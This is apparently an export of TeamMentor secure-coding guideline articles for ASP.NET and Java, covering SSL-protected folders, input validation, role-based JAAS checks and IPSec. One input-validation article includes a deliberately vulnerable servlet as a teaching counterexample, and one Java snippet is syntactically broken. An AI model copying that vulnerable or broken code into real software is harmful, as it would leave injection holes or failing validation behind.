src="http://msdn2.microsoft.com/en-us/library/ms998310.f01paght00001201(en-us,MSDN.10).gif" style="border:1px solid #000"></p><p><strong>Figure - Visual Studio.NET Solution Explorer showing a partitioned Web site</strong></p><p>In Figure 1, secure pages, including the application's login page, are placed in the <strong>Secure</strong> folder beneath the application's virtual root directory. </p><p><strong>To secure pages in a separate subfolder</strong> </p><ol><li>In Microsoft Internet Information Services (IIS), configure the secure folder to require SSL. This sets the <strong>AccessSSL=true</strong> attribute for the folder in the IIS Metabase. Requests for pages in the secured folders are successful only if HTTPS is used for the request URL. </li><li>Use an &lt;<strong>authorization</strong>&gt; element to ensure that only authenticated users can access secure pages. Place this element beneath the closing &lt;<strong>/system.web</strong>&gt; tag, as shown here. <div><pre>&lt;!-- The secure folder is for authenticated and SSL access only. --&gt;<br>&lt;location path="Secure" &gt;<br>  &lt;system.web&gt;<br>    &lt;authorization&gt;<br>      &lt;deny users="?" /&gt;<br>    &lt;/authorization&gt;<br>  &lt;/system.web&gt;<br>&lt;/location&gt;  </pre></div><p>Additionally, the following configuration ensures that unauthenticated users are allowed to access pages in the application's root directory. Place this configuration in the main &lt;<strong>system.web</strong>&gt; element. </p><pre>&lt;system.web&gt;<br>&nbsp; &lt;!-- The virtual directory root folder contains general pages.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unauthenticated users can view them and they do not need <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; to be secured with SSL. --&gt;<br>&nbsp; &lt;authorization&gt;<br>&nbsp;&nbsp;&nbsp; &lt;allow users="*" /&gt;<br>&nbsp; &lt;/authorization&gt;<br>&lt;/system.web&gt;&nbsp; </pre></li></ol><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;If you use this type of site structure, your application must not rely on the user's identity on the non-SSL pages. In the preceding configuration, no forms authentication ticket is sent for requests for non-SSL pages. As a result, the user is considered anonymous. This has implications for related features, such as personalization, that require the user name.<strong> </strong></blockquote><h1>Additional Resources</h1><ul><li>For more information see, "Chapter 4 - Design Guidelines for Secure Web Applications" at <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="564260504" Content_Hash="1910519233">
    <Metadata>
      <Id>75bd5893-aa69-4d39-8cc8-004cee54aaae</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Validate Input for Length, Range, Format, and Type</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>1</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Treat all input as untrusted data. Validate untrusted data using whitelist techniques to check against known good input.</p><h1>Why</h1><p>Unchecked malicious input may lead to integer overflows, injection based attacks, denial of service or information disclosure. </p><h1>When</h1><p>Always validate input. Do not assume that input is good based on origin.</p><h1>How</h1><p>Input can vary in several ways: length, data type contents. It is recommended to verify that all of these meet your application's expectations regarding its input.</p><ol><li><strong>Validating length</strong>: Validating an input's length suggests that your application should check a string's length or the number of bits in a numeric value. Checking the length can help prevent buffer overflows as well as integer overflows in numeric values. A simple way of validating the numeric value can be done through the use of <strong>BigInteger/BigDecimal</strong>:</li></ol><blockquote><blockquote><pre>public boolean validateLength(String input)<br>{<br>      if(validateType(input))<br>      {<br>            BigInteger bi = new BigInteger(input);<br>             if(bi.compareTo(BigInteger.valueOf(0)) &gt; -1<br>               &amp;&amp; bi.compareTo(BigInteger.valueOf(Integer.MAX_VALUE)) &lt; 1)<br>            {<br>                  return true;<br>            }<br>            else<br>            {<br>                  return false;<br>            }<br>      }<br>      else<br>      {<br>             return false;<br>      }<br>}</pre></blockquote></blockquote><ol><li><strong>Validating type</strong>: Validating the input's data type is important when your application expects a specific non-string parameter. Difference in data type can trigger unhandled exceptions that would throw your application into an unknown state. Example for validating that input is of integer value:</li></ol><blockquote><blockquote><pre>public boolean validateType(String input)<br>{<br>      String goodPattern =\\d+;<br>      Pattern p = Pattern.compile(goodPattern);<br>      Matcher m = p.matcher(input);<br>            if(!m.matches())<br>      {<br><br>            return false;<br>      }<br>      else<br>      {<br>            return true;<br>      }<br>}</pre></blockquote></blockquote><ol><li><strong>Validating contents</strong>: Validating the input's contents can be achieved using whitelist and blacklist techniques. The choice between the use of black and white listing is based upon the constraints that are imposed on the input. If the input follows a tight structure and format, then your application can use whitelisting alone to weed out malicious input. If there are unknowns about the input, then a combination of black and white listing must be used. In general, use blacklisting as a backup to whitelisting. Use a spiral-out approach as input is initially validated using whitelist techniques. When whitelisting cannot validate the input, fall back to blacklisting. If blacklist cannot validate, then discard the input.<br></li></ol><blockquote><p>Whitelist: Whitelisting involves the establishment of what is good input to your application. Once good input is defined, your application must compare all input against the established good input. If the input does not resemble good input, your application should discard it. This technique can be implemented using regular expressions. Example:</p><blockquote><pre><br>public boolean validateData(String input)<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String goodPattern = "(\\w|\\d)+";<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int goodLength = 10;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(input.length() &gt; goodLength)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Pattern p = Pattern.compile(goodPattern);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Matcher m = p.matcher(input);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(!m.matches())<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>}</pre></blockquote><p>Examples of useful regular expressions: </p><p><table><tbody><tr><td>Use</td><td>Regular Expression</td><td>Java String</td></tr><tr><td>Valid E-Mail Address</td><td>^\w+(\.|_|-){0,1}\w+@(\w+\.)*\w{3,1024}\.([a-zA-Z]{2}\.){0,1}[a-zA-Z]{2,4}$</td><td>^\\w+(\\.|_|-){0,1}\\w+@(\\w+\\.)*\\w{3,}\\.([a-zA-Z]{2}\\.){0,1}[a-zA-Z]{2,4}$</td></tr><tr><td>Alpha-numeric free text</td><td>(\w|\d|\s|;|\?|!|,|\.|-|:)+</td><td>(\\w|\\d|\\s|;|\\?|!|,|\\.|-|:)+</td></tr><tr><td>Word characters</td><td>\w+</td><td>\\w+</td></tr><tr><td>Numbers</td><td>\d+</td><td>\\d+</td></tr></tbody></table></p></blockquote><ol><ul><li><strong>Blacklist</strong>: Blacklisting involves filtering the input for recognized malicious characters or strings. Using the blacklist approach, the goal is to discard all input that contains known bad data. Because this technique relies on searching the input for all blacklisted characters and/or strings, it can be quite expensive. Example:</li></ul></ol><blockquote><blockquote><pre>public boolean validateData(String input)<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(input.indexOf("&lt;") &gt; -1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(input.indexOf("&gt;") &gt; -1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(input.indexOf("\"") &gt; -1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(input.indexOf("\'") &gt; -1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true;<br>}</pre></blockquote></blockquote><ol><li><p><strong>Note:</strong> This function only describes what blacklisting is. It does not exhaust the different possible inputs that can be blacklisted in an application. Be aware that blacklisting can also be implemented using regular expressions:</p><blockquote><pre>public boolean validateData(String input)<br>{<br>      String badPattern = "(&lt;|\"|\'|(.*))(&lt;|\"|\'|&gt;).*";<br>      int goodLength = 10;<br>      if(input.length() &gt; goodLength)<br>      {<br>            return false;<br>      }<br>      Pattern p = Pattern.compile(badPattern);<br>      Matcher m = p.matcher(input);<br>            if(!m.matches())<br>      {<br>            return true;<br>      }<br>      else<br>      {<br>            return false;<br>      }<br>}</pre></blockquote></li></ol><h1>Problem Example</h1><p>The following code produces a data analysis based on a financial index. Because the code does not validate its input, the application is vulnerable to SQL injection.</p><blockquote><pre>import java.io.*;<br>import java.util.*;<br>import java.lang.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br>import java.util.regex.*;<br> public final class DataAggregator extends HttpServlet<br>{<br>      public void doGet(HttpServletRequest request, HttpServletResponse response)<br>            throws ServletException, IOException<br>      {<br>            PrintWriter out = response.getWriter();<br>            String searchTerm = request.getParameter("index");<br>             String retString;<br>             try<br>            {<br>                  // The application does not validate the user-supplied data<br>                  retString = "The queried index \"";<br>                  retString += encodeHtml(searchTerm); <br>                  retString += "\" produced the following results:&lt;br&gt; ";<br>                  out.println(retString);<br>                  common.aggregateData(out, searchTerm);<br>            }<br>             catch (Exception e)<br>            {<br>                  // Add the appropriate logging and exception handling<br>                  // mechanisms. Consult the Exception Handling and<br>                  // Logging sections<br>                  out.println("We cannot handle your request at the moment."<br>                            + "Please try again later.");<br>            }<br>             out.flush();<br>             out.close();<br>      }<br>  }</pre></blockquote><h1>Solution Example</h1><p>The following code produces a data analysis based on a financial index. Since the code validates the application's input, the application is secured from SQL injection.</p><blockquote><pre>import java.io.*;<br>import java.util.*;<br>import java.lang.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br>import java.util.regex.*;<br> public final class DataAggregator extends HttpServlet<br>{<br>      public void doGet(HttpServletRequest request, HttpServletResponse response)<br>            throws ServletException, IOException<br>      {<br>            PrintWriter out = response.getWriter();<br>            String searchTerm = request.getParameter("index");<br>             try<br>            {<br><br>                  // The application validates the user-supplied data<br>                  if (validateSearchTerm(searchTerm))<br>                  {<br>                        String retString;<br>                        retString = "The queried index \"";<br>                        retString += encodeHtml(searchTerm);<br>                        retString += "\" produced the following results:&lt;br&gt; ";<br>                        out.println(retString);<br>                        common.aggregateData(out, searchTerm);<br>                  }<br>                  else<br>                  {<br>                        // Add the appropriate logging and exception handling<br>                        // mechanisms. Consult the Exception Handling and<br>                        // Logging sections<br>                        out.println("We cannot handle your request at the moment."<br>                                  + "Please try again later.");<br>                  }<br>            }<br>             catch (Exception e)<br>            {<br>                   // Add the appropriate logging and exception handling<br>                   // mechanisms. Consult the Exception Handling and<br>                   // Logging sections<br>                   out.println("We cannot handle your request at the moment."<br>                           + " Please try again later.");<br>            }             out.flush();<br>            out.close();<br>      }<br>         boolean validateSearchTerm(String input)<br>      {<br>            String goodPattern = "(\\w|\\d)+";<br>            int goodLength = 8;<br>             if (input == null)<br>            {<br>                  return false;<br>            }<br>             if(input.length() &gt; goodLength)<br>            {<br>                  return false;<br>            }<br>                        Pattern p = Pattern.compile(goodPattern);<br>            Matcher m = p.matcher(input);<br>                        if(!m.matches())<br>            {<br>                  return false;<br>            }<br>                        return true;<br>      }<br>}</pre></blockquote><h1>Additional Resources</h1><ul><li>A tutorial on regular expressions is available at <a href="http://www.regular-expressions.info/">Regular-Expressions.info</a>. </li><li>For more information on using regular expression in Java, see: Documentation for <a href="http://download.oracle.com/javase/1.4.2/docs/api/java/util/regex/Pattern.html">Class Pattern</a> in Java SDK. </li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43">Guideline: Validate Input from All Sources (Java Web Application)</a> </li><li><a href="ruledisplay:BEC58471-A0EF-40C5-8C9D-9BF5C4B91F1F">Guideline: Filter All User-Supplied Filename and Path Input (Java Web Application)</a> </li><li><a href="ruledisplay:2D8158D1-E2D1-459F-9BD7-56D4B979EFE3">Guideline: Encode All Output Data (Java Web Application)</a> </li><li><a href="ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93">Guideline: Do Not Rely on Client-Side Validation (Java Web Application)</a> </li><li><a href="ruledisplay:044B9F0A-6A95-442C-BF24-3F890D0B10EF">Attack: Client-side Validation Attack</a> </li><li><a href="ruledisplay:092BC54D-5A7F-451F-9EB1-AB0A1F1708C0">Attack: LDAP Injection Attack</a> </li><li><a href="ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E">Attack: Cross Site Scripting Attack</a> </li><li><a href="ruledisplay:198CBDAF-3F87-4291-870D-8B6F077D8D36">Attack: AJAX Injection Attack</a> </li><li><a href="ruledisplay:685CA8C0-E102-4517-A539-4B826D1962EB">Attack: Double Encoding Attack</a> </li><li><a href="ruledisplay:1CCC080F-9290-4BD2-8A2C-6A45F59727B0">Attack: Xpath-XQuery Attack</a> </li><li><a href="ruledisplay:B86F003F-DB0C-41D4-B31A-F9AE1BF7C9C1">Attack: Deserialization of Untrusted Data Attack</a> </li><li><a href="ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764">Attack: SQL Injection Attack</a> </li><li><a href="ruledisplay:B9DD25F1-3C5C-40DD-A82E-464D0C02C14D">Attack: Command Injection Attack</a> </li><li><a href="ruledisplay:208A476B-ABCA-4630-9D02-746C52F47017">Attack: XML Injection Attack</a> </li><li><a href="ruledisplay:6D944640-22E7-421F-8192-45730D5118AB">Checklist Item: Input is Validated for Length, Range, Format and Type (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="283947568" Content_Hash="22571794">
    <Metadata>
      <Id>797a213b-b83a-4acf-b535-692356993b29</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Perform Role-based Security Checks</Title>
      <Category>Authorization</Category>
      <Phase>Design</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Define&nbsp;the different types of users and create specific roles for them. When authorizing access to a resource, build the security checks on a per-role basis rather than on a per-user basis.</p><h1>Why</h1><p>Application roles allow multiple users to play the same role and&nbsp;provides a clear way to manage the least privileges necessary for the execution of a given task. It provides a more robust and flexible way of managing the application's users.</p><h1>When</h1><p>If your application uses access control and authorizes its users to application resources, then define roles and perform role-based security checks.</p><h1>How</h1><p>To apply this concept, the security checks within an application should be executed against a user's role rather than against the actual user.</p><p>Use the following steps when designing the role-based security:</p><ol><li><p><strong>Understand the different types of users</strong>:&nbsp;List the different types of users expected for the application.&nbsp;Define&nbsp;how they will use&nbsp;the application, which resources they will&nbsp;need to&nbsp;access, and any additional rules that will impact&nbsp;how access will vary. Create a matrix mapping roles to resource by describing what action the role can take with each system asset. Use this matrix to identify the different types of users according to the functionality they need.</p><pre>Role       Actions    Access Controls    Client Accounts<br>--------------------------------------------------------<br>Manager    Connect        Always            Always<br>           Read           Always            Always<br>           Use            Always            Occasionally<br>           Modify         Never             Occasionally<br>Employee   Connect        Always            Always<br>           Read           Always            Always<br>           Use            Always            Always<br>           Modify         Never             Never</pre></li><li><p><strong>Establish the roles</strong>: Define in code how each role can access&nbsp;each resources. There are two approaches when enforcing role-based security - programmatic and declarative:</p><ul><li><p><strong>Programmatically</strong>: The programmatic approach to role-based security is written inside the code and provides additional runtime flexibility.<br><br>To enforce role-based security, you need to create a security policy for your application. If you implement this&nbsp;approach using&nbsp;Java Authentication and Authorization Service (JAAS) policies, you can execute a more focused set of security checks such as whether a user is allowed to access a particular resource or perform a specific action. When building the policy, create a role with associated permissions&nbsp;for each type of user. For example, certain roles would be permitted to access the local filesystem while others would not.<br><br>See the <a href="ruledisplay:1131DE2A-C216-4397-97C8-A8D33DE8CC51">Define a Security Policy</a> guideline for more information.</p><blockquote><pre>grant Principal application.auth.GroupToken "administrators"<br>{<br>  permission java.security.SecurityPermission "AccessApp";<br>  permission java.io.FilePermission “/tmp/myapp/cache”, “read,write”;<br>};<br>grant Principal application.auth.GroupToken "users"<br>{<br>  permission java.security.SecurityPermission "AccessApp";<br>};</pre></blockquote></li><li><p><strong>Declarative</strong>: The declarative approach to role-based security is declared within configuration files. While it doesn’t provide much flexibility in the development phase of the code, it allows easy manageability as the declarations can be modified without a recompile. By using the declarative approach, you can easily manage the security settings for&nbsp;large portions of the applications without a need to change the code.<br><br>Java applications that use declarative security rely on a deployment descriptor (e.g. web.xml). The deployment descriptor uses the following elements for role-based security:</p><ul><li><strong>security-constraint</strong>: Defines the access controls associated with a collection of resources as defined in the <strong>web-resource-collection</strong> element. </li><li><strong>web-resource-collection</strong>: Encapsulates a collection of resources that share mutual access controls. </li><li><strong>web-resource-name</strong>: Defines the name for the collection of resources. </li><li><strong>url-pattern</strong>: Identifies the URL of a resource that uses the access controls. </li><li><strong>auth-constraint</strong>: Defines the group of user roles that can access the collection of resources identified by the <strong>web-resource-collection</strong> element. </li><li><strong>role-name</strong>: Defines the roles that can access the collection of resources. </li><li><strong>http-method</strong>: Identifies the HTTP method upon which the access controls will be enforced. For example, your application may enforce access controls for POST requests, but not GET requests. If omitted, the access controls will apply to all HTTP methods. </li></ul><p>For example:</p><blockquote><pre>&lt;!-- Application's web.xml --&gt;<br>&lt;security-constraint&gt;<br>      &lt;web-resource-collection&gt;<br>            &lt;web-resource-name&gt;Admin Commands&lt;/web-resource-name&gt;<br>            &lt;url-pattern&gt;/admin/*&lt;/url-pattern&gt;<br>            &lt;url-pattern&gt;/config.do&lt;/url-pattern&gt;<br>      &lt;/web-resource-collection&gt;<br>      &lt;auth-constraint&gt;<br>            &lt;role-name&gt;Admin&lt;/role-name&gt;<br>      &lt;/auth-constraint&gt;<br>&lt;/security-constraint&gt;<br> &lt;login-config&gt;<br>      &lt;auth-method&gt;BASIC&lt;/auth-method&gt;<br>      &lt;realm-name&gt;Admin Realm&lt;/realm-name&gt;<br>&lt;/login-config&gt;<br> &lt;!-- The following needs to be included if the application is to<br>     use form-based authentication</pre></blockquote><p>In web.xml:</p><blockquote><pre>&lt;login-config&gt;<br>      &lt;auth-method&gt;FORM&lt;/auth-method&gt;<br>      &lt;form-login-config&gt;<br>            &lt;form-login-page&gt;/loginForm.jsp&lt;/form-login-page&gt;<br>            &lt;form-error-page&gt;/loginFailed.html&lt;/form-error-page&gt;<br>      &lt;/form-login-config&gt;<br>&lt;/login-config&gt;</pre></blockquote><p>In loginForm.jsp:</p><blockquote><pre>&lt;form method="POST" action="j_security_check"&gt;<br>&lt;input type="text" name="j_username"&gt;<br>&lt;input type="password" name="j_password"&gt;<br>&lt;input type="submit" value="log in"&gt;<br>&lt;/form&gt;--&gt;</pre></blockquote><p>Because declarative security asks the hosting server to handle authentication and authorization, there is the risk of disclosing connection strings, database credentials, etc.; therefore, use a JAAS LoginModule when using declarative security.<br><br>Example using Tomcat (if you use a different environment, please consult its manual):</p><blockquote><pre>      &lt;!-- $TOMCAT_HOME/conf/server.xml --&gt;<br>      &lt;!-- JAAS authentication realm --&gt;<br>      &lt;Realm className="org.apache.catalina.realm.JAASRealm"<br>             appName="AppLoginConfig"<br>             userClassNames="application.auth.GroupToken"<br>             roleClassNames="application.auth.GroupToken"<br>             useContextClassLoader="false"<br>             debug="99"/&gt;</pre></blockquote></li></ul></li><li><p><strong>Manage the users</strong>: Assign the users into their respective user roles. The application should apply the security policy according to the user roles instead of the actual user.</p><blockquote><pre>GroupToken groupToken = new GroupToken(groupName);<br>if(!subject.getPrincipals().contains(groupToken))<br>{<br>      subject.getPrincipals().add(groupToken);<br>}</pre></blockquote><p>For more information regarding security tokens, consult the <a href="ruledisplay:A224E8C9-050B-46D0-9D10-2C91CA1F0FCA">Consider Using JAAS for Authentication</a> guideline. </p></li></ol><h1>Problem Example</h1><p>The following segment illustrates a JAAS policy. Because the application does not enforce role-based security, it has a policy entry for each separate user; therefore, changing the users' access rights can be quite difficult as each user needs to be modified individually.</p><blockquote><pre>grant Principal application.auth.UserToken "joe"<br>{<br>  permission java.security.SecurityPermission "AccessApp";<br>};<br>grant Principal application.auth.UserToken "steve"<br>{<br>  permission java.security.SecurityPermission "AccessApp";<br>};<br>grant Principal application.auth.UserToken "julie" <br>{<br>  permission java.security.SecurityPermission "AccessApp";<br>};</pre></blockquote><h1>Solution Example</h1><p>The following segment illustrates a JAAS policy. Because the application enforces role-based security, it has a policy entry for each group of users; therefore changing the users' access rights is easy as only the group needs to be modified.</p><blockquote><pre>grant Principal application.auth.GroupToken "users"<br>{<br>  permission java.security.SecurityPermission "AccessApp";<br>};</pre></blockquote><h1>Additional Resources</h1><ul><li>For more information about setting Tomcat Realms, see: <a href="http://tomcat.apache.org/tomcat-7.0-doc/realm-howto.html">Tomcat 7: Realm Configuration HOW-TO</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:A224E8C9-050B-46D0-9D10-2C91CA1F0FCA">Guideline: Consider Using JAAS for Authentication (Java Web Application)</a> </li><li><a href="ruledisplay:1131DE2A-C216-4397-97C8-A8D33DE8CC51">Guideline: Define a Security Policy (Java Web Application)</a> </li><li><a href="ruledisplay:6543475A-082B-4E98-8446-F2AFF2EF0553">Guideline: Partition Application Between Public and Private Domains (Java Web Application)</a> </li><li><a href="ruledisplay:FC9AF70F-092C-4AC6-9B54-6793DE17B8DD">Attack: Business Rule Attack</a> </li><li><a href="ruledisplay:152B3F11-E1F6-4885-B1CA-5FBF866E9FF2">Checklist Item: Role-based Security Checks are Performed (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1299302906" Content_Hash="174229457">
    <Metadata>
      <Id>834db5af-d3ce-4fe5-a546-7b5af56f840c</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use IPSsec to Encrypt Traffic Between Servers</Title>
      <Category>Communication Security</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Internet Protocol security (IPSec)&nbsp;provides encryption, integrity, and authentication services for IP-based network traffic.&nbsp;Use&nbsp;IPSec to provide server-to-server protection&nbsp;against internal network threats, including eavesdropping, tampering, man in the middle attacks, IP spoofing, and other password-based attacks by restricting which computers can communicate with each other, and limit the protocols they can communicate with.</p><h1>Why</h1><p>Servers&nbsp;do not usually co-exist in a secure environment. Eavesdropping and spoofing are threats when two or more entities must communicate over&nbsp;typical untrusted mediums such as the public internet&nbsp;or a company intranet. Failure to use IPSec&nbsp;increases the likleihood&nbsp;that data traveling on the network will be intercepted, modified, or&nbsp;stolen.</p><h1>When</h1><p>IPSec can be used&nbsp;for the following tasks:</p><ul><li>Provide message confidentiality by encrypting all of the data sent between two computers. </li><li>Provide message integrity between two computers (without encrypting data). </li><li>Provide mutual authentication between two computers. For example, you can help secure a database server by establishing a policy that permits requests only from a specific client computer (for example, an application or Web server). </li><li>Restrict which computers can communicate with one another. You can also restrict communication to specific IP protocols and TCP/UDP ports.</li></ul><p>&nbsp;Using IPSec is not a a possibility when the two servers are not using static ip addresses.</p><h1>How</h1><p>To secure traffic between two servers, follow these steps:</p><ol><li><p><strong>Create an IP Filter.</strong> This&nbsp;restricts&nbsp;what computers can communicate with each other, and require that&nbsp;specific&nbsp;communication protocols are used.&nbsp;A filter consists of:</p><ul><li>A source IP address or range of addresses. </li><li>A destination IP address or range of addresses. </li><li>An IP protocol, such as TCP, UDP, or "any." </li><li>Source and destination ports (for TCP or UDP only).</li></ul></li><li><p><strong>Create Filter Actions.</strong> This procedure creates two filter actions. The first will be used to block all communications from specified computers and the second will be used to enforce the use of encryption between application server and database server computers. </p></li><li><p><strong>Create Rules.</strong> This procedure creates two new rules that will be used to associate the filter that you created in Procedure 1, with the two filter actions you created in Procedure 2. </p></li><li><p><strong>Export the IPSec Policy to the Remote Computer.</strong> The IPSec policy that you have created on the database server must now be exported and copied to the application server computer. </p></li><li><p><strong>Assign Policies.</strong> An IPSec policy must be assigned before it becomes active. Note that only one policy may be active at any one time on a particular computer. </p></li><li><p><strong>Verify that it Works.</strong> Use Network Monitor (netmon.exe) to verify that data sent between the two servers&nbsp;is encrypted. </p></li></ol><h1>Additional Resources</h1><ul><li>How To: Use IPSec to Provide Secure Communication Between Two Servers&nbsp;<a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT18.asp">http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT18.asp</a> </li><li>How To: Use IPSec for Filtering Ports and Authentication <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/HTUseIPSec.asp">http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/HTUseIPSec.asp</a> </li><li>How To: Use IPSec Policy to Secure Terminal Services Communications in Windows Server 2003 <a href="http://support.microsoft.com/kb/816521">http://support.microsoft.com/kb/816521</a> </li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:ecfc4c67-2a6c-443e-844e-8a3051fe54f3">Use IPSsec to Encrypt Traffic Between Servers</a> </li><li><a href="ruledisplay:4d8acde8-c44d-46f2-84f1-0c9a8fd1710a">Appropriate Mechanism of Secure Communication (IPSec or SSL) is used, Depending on Application Requirement</a> </li><li><a href="ruledisplay:0c3fe1a1-c49c-4187-872e-246e07c875f9">For Communication Between Web Browser and Web Server, SSL is used When Pages Need to be Encrypted</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="667238788" Content_Hash="238070967">
    <Metadata>
      <Id>8b8b0ec3-7ad7-4c0f-bcaf-ce30b56b4e50</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Assume All Input Is Malicious</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Web Application</li></ul><h1>What to Do</h1><p>Applications should assume that all of their input is malicious, and take action accordingly.&nbsp; Input should&nbsp;be validated and either rejected or sanitized immediately, carefully quarantined during use, and encoded appropriately on output.</p><h1>Why</h1><p>Malicious input is the single largest cause of vulnerabilities in web applications, and in the most general sense, is the root cause of almost every issue.&nbsp; The only way to ensure safety is by a defense in depth, default deny policy that starts with the fundamental supposition that all input is malicious until proven otherwise. For example, if you call an external Web service that returns strings, how do you know that malicious commands are not present? Also, if several applications write to a shared database, when you read data, how do you know whether it is safe?</p><h1>When</h1><p>All applications should assume that all their input is malicious.</p><h1>How</h1><p>Getting input validation correct is tricky; there's a reason that it's the number one security problem for web applications.&nbsp; However, when approached systematically, it's not too hard of a&nbsp;problem to solve.&nbsp; Follow these steps:</p><h2>1. Determine all inputs</h2><p>The first step is to determine all the things in the application which can be controlled by the user.&nbsp; There are some surprises here -- a lot of the variables in a normal HTTP server environment are actually taken from the user's request, so make sure you know exactly where everything is coming from.&nbsp; It's a good idea to leave a brief comment in the code where the input comes in mentioning where it comes from (if it isn't obvious from context), the expected format, and where it's validated (again, if it isn't obvious).</p><h2>2. Determine all trusted data stores</h2><p>&nbsp;Every application has at least one, usually multiple data stores.&nbsp; It's important to know when a data store can be trusted.&nbsp; The guideline here is simple; if the system in question is the only input into the data store, then you can rely on the semantics enforced by your input validation routines to apply to all data found in the store.&nbsp; If other applications access the data store, then you can't.&nbsp; While it is possible to check the semantics of every validation routine in every other system that accesses the data store, it's simpler and safer to assume that the data store is untrusted, and treat it as a potential source of malicious data, validating all input from it as you would any other input.</p><h2>3. Determine all crossover points</h2><p>Crossover points are one of the places where malicious input becomes a bug.&nbsp; They're not necessarily places where output occurs; in fact, they'll often occur many layers further in than 